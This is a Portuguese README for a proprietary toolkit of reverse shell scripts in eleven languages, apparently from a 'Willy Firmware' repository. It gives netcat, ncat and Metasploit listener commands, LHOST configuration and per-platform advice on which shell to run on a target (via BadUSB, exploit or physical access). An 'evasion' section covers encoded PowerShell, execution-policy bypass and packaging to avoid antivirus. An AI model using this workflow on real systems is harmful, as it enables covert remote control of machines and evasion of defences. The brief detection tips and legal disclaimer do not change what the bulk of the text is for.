# 🔄 ReverseShell Scripts

![ESP32](https://img.shields.io/badge/ESP32-WROOM--32-red.svg)
![Arduino](https://img.shields.io/badge/Arduino-IDE-blue.svg)
![C++](https://img.shields.io/badge/C++-17-blue.svg)
![Python](https://img.shields.io/badge/Python-3.9+-yellow.svg)
![Security](https://img.shields.io/badge/Security-Pentest-red.svg)
![Hacking](https://img.shields.io/badge/Hacking-Tools-red.svg)
![Red Team](https://img.shields.io/badge/Red%20Team-Offensive-red.svg)
![Network](https://img.shields.io/badge/Network-TCP%2FIP-blue.svg)
![Shell](https://img.shields.io/badge/Shell-Bash%2FPowershell-orange.svg)

Scripts de reverse shell para estabelecimento de conexão remota - Proprietário

---

## ⚠️ Aviso Legal

**USE APENAS EM SISTEMAS AUTORIZADOS!** O uso indevido pode ser crime. Estes scripts são fornecidos exclusivamente para fins educacionais e de pesquisa em segurança.

---

## 📖 O Que é Reverse Shell?

Reverse shell é uma técnica onde o sistema alvo se conecta de volta ao atacante, permitindo execução remota de comandos. Diferente de um shell tradicional (onde você conecta ao alvo), no reverse shell o alvo conecta a você.

---

## 🚀 Como Usar

### 1. Preparar o Listener (Seu Computador)

```bash
# Netcat básico
nc -lvnp 4444

# Netcat com SSL
ncat --ssl -lvnp 4444

# Metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

### 2. Configurar o Script

Edite o arquivo e altere:

```python
LHOST = "192.168.1.100"  # SEU IP
LPORT = 4444              # PORTA DO LISTENER
```

### 3. Executar no Alvo

Como executar depende do contexto (BadUSB, exploit, acesso físico, etc).

---

## 📁 Arquivos Disponíveis

| Arquivo | Linguagem | Uso | Características |
|---------|-----------|-----|-----------------|
| `python_reverse.py` | Python 2/3 | Linux/Windows | Básico, compatível |
| `python3_encrypted.py` | Python 3 | Linux/Windows | AES-256, upload/download |
| `bash_reverse.sh` | Bash | Linux/macOS | Simples, one-liner |
| `powershell_reverse.ps1` | PowerShell | Windows | Full interativo |
| `powershell_https.ps1` | PowerShell | Windows | SSL/TLS, bypass AV |
| `netcat_reverse.sh` | Bash | Linux | Requer nc |
| `perl_reverse.pl` | Perl | Linux/Unix | Alternativa |
| `nodejs_reverse.js` | Node.js | Multi-plataforma | ES6+, classes |
| `php_reverse.php` | PHP | Servidores web | Multi-exec |
| `ruby_reverse.rb` | Ruby | Linux/macOS | Classes, Open3 |
| `go_reverse.go` | Go | Multi-plataforma | Compilável |

---

## 💡 Quando Usar Cada Um

### Windows

- `powershell_reverse.ps1` - Mais compatível
- `powershell_https.ps1` - Se houver firewall/AV
- `python_reverse.py` - Se Python instalado
- `go_reverse.go` - Compilado, sem dependências

### Linux

- `bash_reverse.sh` - Mais simples
- `python_reverse.py` - Python quase sempre disponível
- `perl_reverse.pl` - Perl geralmente instalado
- `netcat_reverse.sh` - Se nc disponível

### Servidores Web

- `php_reverse.php` - Servidores com PHP

### Contêineres/Cloud

- `nodejs_reverse.js` - Ambientes Node.js
- `go_reverse.go` - Binário estático

---

## 🔧 Compilação (Go)

```bash
# Linux
go build -o shell go_reverse.go

# Windows
GOOS=windows go build -o shell.exe go_reverse.go

# Reduzir tamanho
go build -ldflags="-s -w" -o shell go_reverse.go
```

---

## 🛡️ Evasão Básica

### PowerShell

```powershell
# Ofuscar
powershell -enc <base64_encoded_command>

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
```

### Python

```bash
# Compilar para bytecode
python -m py_compile script.py

# Usar PyInstaller
pyinstaller --onefile script.py
```

---

## 🔒 Detecção e Mitigação

### Como Detectar

- Monitorar conexões de saída
- SIEM alerts para reverse shells
- EDR/AV signatures

### Como Prevenir

- Firewall restritivo
- Segregação de rede
- Monitoramento de processos

---

## 📚 Referências

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks](https://book.hacktricks.xyz/shells/shells)

---

## 📜 Licença

**⚠️ SOFTWARE PROPRIETÁRIO - TODOS OS DIREITOS RESERVADOS**

Estes scripts de reverse shell são propriedade exclusiva da Willy Firmware e são fornecidos sob licença estritamente controlada.

### Termos de Uso

- **Uso Exclusivo**: Estes scripts podem ser utilizados apenas pelo proprietário autorizado
- **Modificação Proibida**: Qualquer modificação ou distribuição é estritamente proibida
- **Responsabilidade**: O usuário é o único responsável pelo uso dos scripts
- **Restrições**: Uso permitido apenas em sistemas autorizado por escrito

### Limitações de Responsabilidade

A Willy Firmware não se responsabiliza por:

- Qualquer dano resultante do uso não autorizado dos scripts
- Consequências legais de atividades realizadas com reverse shells
- Uso indevido ou violação dos termos de licença

### Direitos Autorais

© 2026 Willy Firmware. Todos os direitos reservados.

### Contato

Para informações sobre licenciamento ou suporte, entre em contato através dos canais oficiais da Willy Firmware.

---

**⚠️ AVISO LEGAL**: O uso destes scripts implica concordância total com os termos de licença proprietária. Qualquer violação resultará em ações legais cabíveis.

---
*Use com responsabilidade! 🔐*
